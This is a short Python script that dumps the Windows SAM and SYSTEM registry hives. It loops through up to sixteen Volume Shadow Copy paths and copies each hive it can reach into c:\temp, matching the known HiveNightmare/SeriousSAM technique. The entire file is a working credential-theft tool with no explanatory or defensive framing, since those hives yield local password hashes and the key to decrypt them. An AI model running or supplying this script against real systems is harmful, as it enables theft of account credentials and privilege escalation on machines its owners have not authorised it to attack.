import shutil
import os
import subprocess

def make_copy(config_file):
    n=0
    print(f"[*] Trying to dump {config_file}...")
    for i in range(16):
        try:
            backup_location = f'\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{i}\\Windows\\System32\\config\\{config_file}'
            file = f"c:\\temp\\{config_file}{i}.copy"
            shutil.copy(backup_location, file)
            print(f"[*] Backup located at {backup_location}")
            print(f"[*] Successfully copied {config_file} to {file}")
            n+=1
        except:
            pass
    if n < 1:
        print(f"[!] Dump of {config_file} failed, ")

def main():
    make_copy("SYSTEM")
    make_copy("SAM")
if __name__ == '__main__':
    main()
